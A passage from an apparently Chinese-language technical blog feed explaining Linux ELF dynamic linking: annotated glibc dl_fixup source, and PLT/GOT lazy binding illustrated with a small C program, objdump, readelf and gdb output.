(ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    <span class="comment">//检查r_info最低为是不是R_386_JMP_SLOT=7</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) <span class="comment">//判断(sym-&gt;st_other)&amp;0x03是否为0</span></span><br><span class="line">&#123;                                        </span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =(<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">      version = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">  <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">  &#123;</span><br><span class="line">    THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">    flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">//通过strtab + sym-&gt;st_name找到函数字符串，result为libc基地址</span></span><br><span class="line">  result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">        version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">  THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"> </span><br><span class="line">  <span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">//libc基地址+解析函数的偏移地址，即函数的真实地址</span></span><br><span class="line">  value = DL_FIXUP_MAKE_VALUE (result,sym ? (LOOKUP_VALUE_ADDRESS (result)+ sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">  result = l;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">    &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">  value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">//将got表中的数据修改为函数的真实地址</span></span><br><span class="line">  <span class="comment">//value为函数真实地址，rel_addr为需要修改的got表地址。</span></span><br><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br></pre></td></tr></table></figure><h3 id="链接过程"><a href="#链接过程" class="headerlink" title="链接过程"></a>链接过程</h3><h4 id="概括描述"><a href="#概括描述" class="headerlink" title="概括描述"></a>概括描述</h4><p>​完成延迟绑定的函数主要是 dl_runtime__resolve(link_map_obj, reloc_arg) ，该函数的第一个参数是一个 link_map 结构，第二个参数是一个重定位参数，即运行 PLT 中的代码时 PUSH 进栈中的参数。该函数主要是调用一个 dl_fixup(link_map_obj, reloc_arg) 完成了主要功能。参数一的主要作用是：获得重定位函数所在了的libary 的基地址，以及获取在 libary 中寻找需要定位函数时所需要的 Section (.dynstr .dynsym 等)。第二个函数主要是确定需要解析的函数名，以及解析完之后写回的地址。<br>  该过程可以先大概理解为，dl_fixup 函数通过 reloc_arg 参数确定当前正在解析的函数名。之后，拿着这个函数名，再利用 link_map 结构找到 libary 中的 .dynsym .dynstr 。利用 .dynsym .dynstr 进行匹配。若匹配成功，则从 .dynsym 中获取该函数的函数地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//上边的详细过程</span><br><span class="line">reloc_arg  --&gt;  函数名 A</span><br><span class="line"></span><br><span class="line">利用 link_map --&gt; l_info[x] 通过改变 x 的值，确定 .dynsym .dynstr</span><br><span class="line">再用 .dynsym 与 .dynstr 对整个动态符号表 .dynstym 进行遍历，去匹配函数名 A</span><br><span class="line">若 某一个 Elf64_Sym(符号) 的 st_name + .dynstr == A</span><br><span class="line">则 该 Elf64_Sym 表示的符号即为函数 A</span><br><span class="line"></span><br><span class="line">// 整个过程可以这样理解，不过真实情况使用的 Hash方法去寻找的这个 Elf64_Sym(符号)</span><br></pre></td></tr></table></figure><h4 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h4><ul><li>调用某个函数后进入该函数的 PLT[x] ，在 PLT[x] 中 push 一个参数 reloc_arg</li></ul><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222312455.jpeg"></p><p>​拿到这个 reloc_arg 后，链接器会通过该值找到对应函数的 Elf_Rel 结构，通过该结构的 r_info 变量中的偏移量找到对应函数的 Elf_Sym 结构，然后再通过 Elf_Sym 结构的 st_name 结合之前已经确定的 .dynstr 地址，通过 st_name + .dynstr 获得对应函数的函数名。这就是拿到 reloc_arg 参数后链接器获得的信息，即知道了本次链接中的函数的函数名。（注：此处用到的 binary 中的 Elf_Rel Elf_Sym .dynstr 等地址都是通过 link_map-&gt;l_info[x] 的方式寻找的。）</p><ul><li>在链接过程中 PLT[0] 会 push dl_runtime_resolve 函数的第二个参数 link_map</li></ul><p>​拿到这个变量后链接器会获得所要解析的函数的函数库(通过 link_map 的 l_next 字段)，然后拿到这个外部库之后 link_map 的 l_addr 字段会记录该库的基地址，然后链接器通过 new_hash 函数求出要链接函数的 hash（new_hash(st_name + .dynstr)），然后通过该 hash 和之前的保存值进行匹配，如果匹配上就获得了该函数在外部库的 Elf64_Sym 结构，然后通过该结构的 st_value 获取该函数在外部库里面的偏移，最后通过 st_value + l_addr 获取该函数的真实地址，最后通过 Elf64_Rel 的 r_offset 定位该函数在 GOT 中对应的地址，然后将最后结果写入该地址中。(其中有通过这两个参数共同获得的东西，不过为了便于理解就不再分开讨论。)</p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>详见：高级ROP-ret2dlslove</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://blog.csdn.net/weixin_44966641/article/details/120631079">Linux下的ELF文件、链接、加载与库（含大量图文解析及例程）_elf共享目标文件的格式和加载过程_Adenialzz的博客-CSDN博客</a></li><li><a href="https://www.cnblogs.com/yinheyi/p/13800614.html">ELF文件与链接过程 - 殷大侠 - 博客园 (cnblogs.com)</a></li><li><a href="https://bbs.kanxue.com/thread-258597.htm#msg_header_h1_1">深入窥探动态链接-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PLT表与GOT表延迟绑定机制</title>
      <link href="/article/e9e.html"/>
      <url>/article/e9e.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux动态链接中的PLT和GOT"><a href="#Linux动态链接中的PLT和GOT" class="headerlink" title="Linux动态链接中的PLT和GOT"></a>Linux动态链接中的PLT和GOT</h1><h2 id="动态链接和静态链接的简单理解"><a href="#动态链接和静态链接的简单理解" class="headerlink" title="动态链接和静态链接的简单理解"></a>动态链接和静态链接的简单理解</h2><p>可以理解为：如果文章引用了别人的一部分文字，把别人的段落复制到我的文章中·，就属于静态链接，动态链接就可以理解为给一个超链接让自己去看</p><h2 id="PLT和GOT"><a href="#PLT和GOT" class="headerlink" title="PLT和GOT"></a>PLT和GOT</h2><p>Linux下的动态链接是通过PLT &amp; GOT实现的，使用测试代码test.c来进行理解</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">   <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_banner</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to World of PLT and GOT\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用下列命令：</p><p>编译：<code>gcc -Wall -g -o test.o -c test.c -m32</code></p><p>链接：<code>gcc -o test test.o -m32</code></p><p>现在的Linux系统为x86_64系统，因为后续需要对中间文件test.o以及可执行文件test反编译，分析汇编指令，因此使用-m32来生成i386架构指令</p><p>通过<code>objdump -d test.o</code>查看反汇编</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 &lt;print_banner&gt;:</span><br><span class="line">   0:f3 0f 1e fb          endbr32 </span><br><span class="line">   4:55                   push   %ebp</span><br><span class="line">   5:89 e5                mov    %esp,%ebp</span><br><span class="line">   7:53                   push   %ebx</span><br><span class="line">   8:83 ec 04             sub    $0x4,%esp</span><br><span class="line">   b:e8 fc ff ff ff       call   c &lt;print_banner+0xc&gt;</span><br><span class="line">  10:05 01 00 00 00       add    $0x1,%eax</span><br><span class="line">  15:83 ec 0c             sub    $0xc,%esp</span><br><span class="line">  18:8d 90 00 00 00 00    lea    0x0(%eax),%edx</span><br><span class="line">  1e:52                   push   %edx</span><br><span class="line">  1f:89 c3                mov    %eax,%ebx</span><br><span class="line">  21:e8 fc ff ff ff       call   22 &lt;print_banner+0x22&gt;</span><br><span class="line">  26:83 c4 10             add    $0x10,%esp</span><br><span class="line">  29:90                   nop</span><br><span class="line">  2a:8b 5d fc             mov    -0x4(%ebp),%ebx</span><br><span class="line">  2d:c9                   leave  </span><br><span class="line">  2e:c3                   ret    </span><br><span class="line"></span><br><span class="line">0000002f &lt;main&gt;:</span><br><span class="line">  2f:f3 0f 1e fb          endbr32 </span><br><span class="line">  33:55                   push   %ebp</span><br><span class="line">  34:89 e5                mov    %esp,%ebp</span><br><span class="line">  36:83 e4 f0             and    $0xfffffff0,%esp</span><br><span class="line">  39:e8 fc ff ff ff       call   3a &lt;main+0xb&gt;</span><br><span class="line">  3e:05 01 00 00 00       add    $0x1,%eax</span><br><span class="line">  43:e8 fc ff ff ff       call   44 &lt;main+0x15&gt;</span><br><span class="line">  48:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  4d:c9                   leave  </span><br><span class="line">  4e:c3                   ret    </span><br><span class="line"></span><br><span class="line">Disassembly of section .text.__x86.get_pc_thunk.ax:</span><br><span class="line"></span><br><span class="line">00000000 &lt;__x86.get_pc_thunk.ax&gt;:</span><br><span class="line">   0:8b 04 24             mov    (%esp),%eax</span><br><span class="line">   3:c3                   ret    </span><br></pre></td></tr></table></figure><p>print_banner()内调用了printf()，printf()函数在glibc动态库里。在编译和链接阶段，链接器无法知道进程运行起来后printf函数的加载地址，所以上面<code>call &lt;print_banner+0x22&gt;</code>是无法填充的，只有进程运行起来以后，printf函数的地址才能确定。</p><p>接下来要做的就是修改（重定位）call指令，简单的办法就是将指令中的printf_banner改为printf真正的函数地址，但是会出现两个问题：</p><blockquote><p>目前的操作系统不允许修改代码段，只能够修改数据段</p><p>如果printf_banner是类似于printf()一样的函数，在动态链接库（.so对象内），那么修改它就没有办法做到系统内所有进程共享同一个动态库。</p></blockquote><p><strong>因此，printf函数地址只能回写到数据段内，而不能回写到代码段上。</strong></p><blockquote><p><strong>回写：指运行时修改，即运行时重定位，与之对应的还有链接时重定位。</strong></p></blockquote><p>编译阶段，是将.c文件的源代码翻译成汇编指令的中间文件，即上面生成的.o中间文件。分析上面生成的printf_banner的汇编指令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 &lt;print_banner&gt;:</span><br><span class="line">   0:f3 0f 1e fb          endbr32 </span><br><span class="line">   4:55                   push   %ebp</span><br><span class="line">   5:89 e5                mov    %esp,%ebp</span><br><span class="line">   7:53                   push   %ebx</span><br><span class="line">   8:83 ec 04             sub    $0x4,%esp</span><br><span class="line">   b:e8 fc ff ff ff       call   c &lt;print_banner+0xc&gt;</span><br><span class="line">  10:05 01 00 00 00       add    $0x1,%eax</span><br><span class="line">  15:83 ec 0c             sub    $0xc,%esp</span><br><span class="line">  18:8d 90 00 00 00 00    lea    0x0(%eax),%edx</span><br><span class="line">  1e:52                   push   %edx</span><br><span class="line">  1f:89 c3                mov    %eax,%ebx</span><br><span class="line">  21:e8 fc ff ff ff       call   22 &lt;print_banner+0x22&gt;</span><br><span class="line">  26:83 c4 10             add    $0x10,%esp</span><br><span class="line">  29:90                   nop</span><br><span class="line">  2a:8b 5d fc             mov    -0x4(%ebp),%ebx</span><br><span class="line">  2d:c9                   leave  </span><br><span class="line">  2e:c3                   ret    </span><br></pre></td></tr></table></figure><p>可以注意到，call指令的操作数为<code>e8 fc ff ff ff</code>，由x86的小端序可以翻译为0xfffffffc，即有符号数-4。这里应该存放printf函数的地址，但是由于编译阶段无法知道printf函数的地址，所以预先放一个-4，用重定位项来描述：<strong>这个地址在链接时会被修正，它的修正值是根据printf的地址（符号）来修正，修正方式按相对引用方式。</strong>这个过程被称为链接时重定位，与上面的运行时重定位原理完全一样，只是修正的时机不一样。</p><p>链接阶段，是将一个或多个中间文件（.o文件）通过链接器将它们链接成一个可执行文件，链接阶段的主要任务：</p><blockquote><ol><li>将各个中间文件之间同名的section合并</li><li>对代码段、数据段以及各符号段进行地址分配</li><li>链接时重定位修正</li></ol></blockquote><p><strong>除了重定位过程，其他的动作不能够修改中间文件的函数体内指令，重定位也不能修改编译过程生成的汇编指令，只能修改指令中的操作数。</strong></p><p>但是在编译阶段，编译器没有办法知道printf函数是在glibc运行库还是在其他的.o中，那么编译器只能生成调用printf的指令，不管printf在glibc还是在其他.o定义都能工作。如果是在其他的.o中定义了printf函数，那么在链接阶段，printf的地址就已经确定，可以直接重定位。如果printf定义在动态库内（定义在动态库内不知道地址），链接阶段无法做重定位。</p><p>前面说运行时重定位无法修改代码，只能将printf重定位到数据段，那么就需要call指令感知到重定位好的数据段内容。链接器生成一段额外的小代码片段，通过这段代码获取printf函数地址，并完成对它的调用。</p><p>链接器生成的额外代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">printf_stub:</span><br><span class="line">    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址</span><br><span class="line">    jmp rax // 跳过去执行printf函数</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的储存地址：</span><br><span class="line">　　这里储存printf函数重定位后的地址</span><br></pre></td></tr></table></figure><p>链接阶段能够发现printf函数在定义动态库时，链接器会生成一段代码printf_stub，printf_stub取代原来的printf，因此转化为链接阶段对printf_stub做链接重定位，而运行时才对printf做运行时重定位。</p><p>总结来说，动态链接每个函数需要两个东西：</p><ol><li>用来存放外部函数地址的数据段</li><li>用来获取数据段记录的外部函数地址的代码</li></ol><p>如果可执行文件中调用多个动态库函数，那每个函数都需要这两样东西，这样每样东西就形成一个表，每个函数使用其中一项。对应两个表，用来<strong>存放外部函数地址的数据表称为全局偏移表（GOT，Global Offset Table）</strong>，<strong>存放额外代码的表称为程序链接表（PLT，Procedure Link Table）</strong>。</p><p>用大佬的文章里的示意图来说明PLT&amp;GOT是怎么运行的：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222009223.jpeg" alt="PLT和GOT原理雏形"></p><p>可执行文件里面保存的是PLT表的地址，对应PLT地址指向的是GOT的地址，GOT表指向的是glibc的地址，当然这个图不能完整地描述Linux下的PLT&amp;GOT真实过程。</p><h2 id="延迟重定位"><a href="#延迟重定位" class="headerlink" title="延迟重定位"></a>延迟重定位</h2><p>前面说到的PLT从GOT表中获取地址并完成调用，这个前提是GOT必须在PLT执行之前，所有函数都已经完成运行时重定位。</p><p>在Linux中，fork之后的父子进程内存的写时拷贝机制、Linux用户态内存空间分配、C++库的string类写时拷贝机制、动态链接中的延迟重定位机制，都会尽可能地延迟退后，直到无法回避才做最后的修正工作。</p><p>当可执行文件调用的动态库很多时，在进程初始化时都会对这些函数做地址解析和重定位工作，大大增加进程的启动时间， 所以Linux提出延时重定位机制，只有动态库函数被调用时，才会对地址解析和重定位工作。</p><p>要实现等到调用函数时才做中定位工作的机制就要有一个状态描述该GOT表是否已完成重定位。</p><p>首先能想到的办法就是在GOT表中增加一个状态位，用来描述GOT表项是否已完成重定位，那么每个函数就有两个GOT表项了。</p><p>相应的伪代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="built_in">printf</span>@plt()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">printf</span>@got[<span class="number">0</span>] ！= RELOCATED) &#123; <span class="comment">// 如果没完成重定位</span></span><br><span class="line">        调用重定位函数</span><br><span class="line">        <span class="built_in">printf</span>@got[<span class="number">1</span>] = 地址解析发现的<span class="built_in">printf</span>地址;</span><br><span class="line">        <span class="built_in">printf</span>@got[<span class="number">0</span>] = RELOCATED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    jmp *<span class="built_in">printf</span>@got[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用这个方案会导致占用内存增加一倍，但是仔细观察能发现，这两项明显不会出现同时使用的情况，那么直接用一个GOT项来实现。Linux动态链接器就使用了类似方案。</p><p>把上面的伪代码倒过来写就可以得到新的伪代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="built_in">printf</span>@plt()</span><br><span class="line">&#123;</span><br><span class="line">address_good:</span><br><span class="line">    jmp *<span class="built_in">printf</span>@got            <span class="comment">// 链接器将printf@got填成下一语句lookup_printf的地址</span></span><br><span class="line"></span><br><span class="line">lookup_printf:</span><br><span class="line">        调用重定位函数查找<span class="built_in">printf</span>地址，并写到<span class="built_in">printf</span>@got</span><br><span class="line"></span><br><span class="line">        <span class="keyword">goto</span> address_good;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在链接成可执行文件test时，链接器将printf@got表项的内容填写lookup_printf的地址。</strong></p><p>即程序第一次调用printf时，通过printf@got表引导到查找printf的plt指令的后半部分，在后半部分中跳转到动态链接器中将printf地址解析出来，并重定位回printf@got项内。</p><p>在第二次调用printf时，通过printf@got直接跳到printf执行。</p><p>通过 <code>objdump -d test &gt; test.asm</code> 可以看到其中 plt 表项有三条指令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">080482d0 &lt;common@plt-0x10&gt;:</span><br><span class="line"> 80482d0:ff 35 04 a0 04 08    pushl  0x804a004</span><br><span class="line"> 80482d6:ff 25 08 a0 04 08    jmp    *0x804a008</span><br><span class="line"> 80482dc:00 00                add    %al,(%eax)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">080482e0 &lt;puts@plt&gt;:</span><br><span class="line"> 80482e0:ff 25 0c a0 04 08    jmp    *0x804a00c</span><br><span class="line"> 80482e6:68 00 00 00 00       push   $0x0</span><br><span class="line"> 80482eb:e9 e0 ff ff ff       jmp    80482d0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line">080482f0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80482f0:ff 25 10 a0 04 08    jmp    *0x804a010</span><br><span class="line"> 80482f6:68 08 00 00 00       push   $0x8</span><br><span class="line"> 80482fb:e9 d0 ff ff ff       jmp    80482d0 &lt;_init+0x28&gt;</span><br></pre></td></tr></table></figure><p>（将第一项plt表修改成**<code>&lt;common@plt&gt;</code>**项，objdump -d输出结果会使用错误的符号名。那是因为该项是没有符号的，而objdump输出时，给它找了一个地址接近符号，所以会显示错误的符号名，为了避免引起误解，直接删掉）</p><p>每个plt指令中的jmp指令都是访问相应的got表项，在函数第一次调用之前，这些got项的内容都是链接器生成的，它的值指向plt中jmp的下一条指令。</p><p>可以通过gdb查看got表内容：（先 <code>gdb test</code> 然后 <code>b main</code>，再 <code>run</code>， 再 <code>x/x 地址</code>或<code>x/xw 地址</code> 就可以）</p><p><img src="/../../../Daily/Temp/image-20230712164219794.png" alt="image-20230712164219794"></p><p><code>0x080182e6</code>即jmp下一条的指令地址。</p><p><code>push $0x0</code>将数据压到栈上，作为将要执行的函数的参数。</p><p><code>jmp 80482d0</code>跳转到第一个表项，所有的plt都跳转到common@plt中执行，这是动态链接做符号解析和动态链接的公共入口，并不是每个plt表都有的重复的一份指令。</p><h2 id="公共GOT表项"><a href="#公共GOT表项" class="headerlink" title="公共GOT表项"></a>公共GOT表项</h2><p>将前面提到的公共plt摘取出来：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">080482d0 &lt;common@plt-0x10&gt;:</span><br><span class="line"> 80482d0:ff 35 04 a0 04 08    pushl  0x804a004</span><br><span class="line"> 80482d6:ff 25 08 a0 04 08    jmp    *0x804a008</span><br><span class="line"> 80482dc:00 00                add    %al,(%eax)</span><br></pre></td></tr></table></figure><p><code>pushl  0x804a004</code>是将地址压到栈上，向最终调用的函数传递参数，<code>jmp *0x804a008</code>跳到最终的函数去执行，即跳到能解析动态库函数地址的代码里面执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-peda$ file test</span><br><span class="line">Reading symbols from test...done.</span><br><span class="line">gdb-peda$ x/xw 0x804a008</span><br><span class="line">0x804a008:0x00000000</span><br><span class="line">gdb-peda$ b main</span><br><span class="line">Breakpoint 1 at 0x8048435: file test.c, line 8.</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/giantbranch/Desktop/PWN/test </span><br><span class="line">...</span><br><span class="line">gdb-peda$ x/xw 0x804a008</span><br><span class="line">0x804a008:0xf7fee000</span><br></pre></td></tr></table></figure><p>可以看出，进程还没有运行时，值为0x00000000，当进程运行起来时，值变为了0xf7fee000，如果做更进一步的调试会发现这个地址位于动态链接器内，对应的函数为**_dl_runtime_resolve**。</p><p>接下来需要解决三个问题：</p><ul><li>_dll_runtime_resolve是怎么知道要查找printf函数的</li><li>_dll_runtime_resolve找到printf函数地址后，怎么知道回写到哪个GOT表项</li><li>到底 _dll_runtime_resolve是什么时候被写到GOT表的</li></ul><p>前两个问题，以printf@plt为例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf@plt&gt;:</span><br><span class="line">   jmp *0x804a00c</span><br><span class="line">   push $0x00</span><br><span class="line">   jmp common@plt</span><br></pre></td></tr></table></figure><p>第二条指令中，每个xxx@plt的第二条指令push的操作数都不一样，相当于函数的id，动态链接器通过它可以知道要解析哪个函数。</p><p>使用<code>readelf -r test</code>命令可以查看test可执行文件中的重定位信息，查看.rel.plt这段：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/PWN$ readelf -r test</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rel.dyn&#x27; at offset 0x290 contains 1 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049ffc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rel.plt&#x27; at offset 0x298 contains 2 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804a00c  00000107 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0</span><br><span class="line">0804a010  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br></pre></td></tr></table></figure><p>和前面各函数plt指令中的push操作数结合起来看：</p><p>printf对应push 0x0， _libc_start_main对应push 0x8，这些操作数对应这两个函数在.rel.plt段的偏移量，在 _dl_runtime_resolve函数内，根据这个offset和.rel.plt段的信息，就知道要解析的函数。.rel.plt最左边的offset字段，它就是GOT表项的地址，也即 _dl_runtime_resolve做完符号解析之后，重定位回写的空间。</p><p>第三个问题， 可执行文件在Linux内核通过exeve装载完成后，不直接执行，而是先跳到动态链接器（Id-linux-XXX）执行，在Id-linux-XXX内将_dl_runtime_resolve地址写到GOT表内。</p><p>在i386架构下，除了每个函数占用一个GOT表项以外，GOT表项还保留了三个公共表项，也就是GOT表的前三项，分别为：</p><ul><li>GOT[0]：本ELF动态段（。dynamic段）的装载地址</li><li>GOT[1]：本ELF的link_map数据结构描述符地址</li><li>GOT[2]：_dl_runtime_resolve函数的地址</li></ul><p>动态链接器在加载完ELF后，都会将这三个地址写入GOT表的前三项。</p><p>关于GOT[1]地址，只有link_map结构，结合.rel.plt段的偏移量，才能真正找到该elf的.rel.plt表项。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="关系图"><a href="#关系图" class="headerlink" title="关系图"></a>关系图</h3><p>下图为编译完成后，PLT和GOT的关系图：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222010554.png"></p><p>图中重点标注了从调用printf函数语句的汇编指令call puts@plt跳转过程，序号为跳转顺序</p><p>PLT表结构有如下特点：</p><ul><li>PLT表的第一项为公共表项，剩下的是每个动态库函数为一项</li><li>每项PLT都从对应的GOT表项中读取目标函数地址</li></ul><p>GOT表结构有如下特点：</p><ul><li>GOT表中的前3个为特殊项，分别用于保存.dynamic段地址、本镜像的link_map数据结构地址和_dl_runtime_resolve函数地址，但在编译时，无法获取知道link_map地址和dl_runtime_resolve函数地址，所以编译时填零地址，进程启动时有动态链接器进行填充</li><li>3个特殊项后面依次是每个动态库函数的GOT表项</li></ul><p>可以抽象为以下的伪代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plt[0]:</span><br><span class="line">  pushl got[1]</span><br><span class="line">  jmp  *got[2]</span><br><span class="line"></span><br><span class="line">plt[n]:                // n &gt;= 1</span><br><span class="line">  jmp *got[n+2]        // GOT前3项为公共项，第3项开始才是函数项，plt[1]对应的GOT[3]，以此类推</span><br><span class="line">  push (n-1)*8</span><br><span class="line">  jmp plt[0]</span><br><span class="line"></span><br><span class="line">got[0]  = address of .dynamic section</span><br><span class="line">got[1]  = address of link_map object( 编译时填充0）</span><br><span class="line">got[2]  = address of _dl_runtime_resolve function (编译时填充为0)</span><br><span class="line">got[n+2]  = plt[n] + 6 (即plt[n]代码片段的第二条指令）</span><br></pre></td></tr></table></figure><h3 id="进程启动以后的GOT表"><a href="#进程启动以后的GOT表" class="headerlink" title="进程启动以后的GOT表"></a>进程启动以后的GOT表</h3><p>PLT属于代码段，在进程加载和运行过程都不会发生改变，PLT指向GOT表的关系在编译时已完全确定，唯一能变化的是GOT表。</p><p>Linux加载进程时，通过execve系统调用进入内核态，将镜像加载到内存，然后返回用户态执行。返回用户态时，它的控制权并不是交给可执行文件，而是给动态链接器去完成一些基础的功能，比如上述的GOT[1]，GOT[2]的填写就是这个阶段完成的，下面是动态链接器填完GOT[1]，GOT[2]后的GOT图：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222011212.jpeg"></p><p>使用<code>readelf -d test</code>（可以在ELF中寻找动态节并显示）命令显示ELF文件的.dynamic段，通过PLTGOT项，动态链接器可以知道GOT表的首地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/PWN$ readelf -d test</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0xf14 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x80482a8</span><br><span class="line"> 0x0000000d (FINI)                       0x80484b4</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x8049f08</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a 